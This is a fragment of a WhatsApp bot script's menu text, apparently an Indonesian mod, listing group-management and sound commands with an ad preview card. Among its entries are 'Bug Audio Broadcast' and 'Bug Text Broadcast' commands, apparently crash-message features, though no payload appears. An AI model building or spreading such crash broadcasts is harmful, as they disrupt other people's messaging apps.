┣⃟⚡bugbcaudio [ Bug Audio Broadcast ]
┣⃟⚡bugbctext [ Bug Text Broadcast ]
┗━━⊱[°slimky°]`,
contextInfo:{"externalAdReply": {"title": `SC °slimky°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@slimkymods1211`,
thumbnailUrl: 'https://telegra.ph/file/10c3793a558ced7ba5ff0.jpg', 
...
┏━━⊱[ GROUP MENU ]
┣⃟⚡linkgroup
┣⃟⚡ephemeral [di group]
┣⃟⚡setppgc /full [image]
┣⃟⚡setppbot / full [image]
┣⃟⚡setname [text]
┣⃟⚡setdesc [text]
┣⃟⚡group [option]
┣⃟⚡editinfo [option]
...
┣⃟⚡slimkysound161
┗━━⊱[ © °slimky°]`,
contextInfo:{"externalAdReply": {"title": `SC © °slimky`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@slimkymods1211`,
thumbnailUrl: 'https://telegra.ph/file/10c3793a558ced7ba5ff0.jpg', 
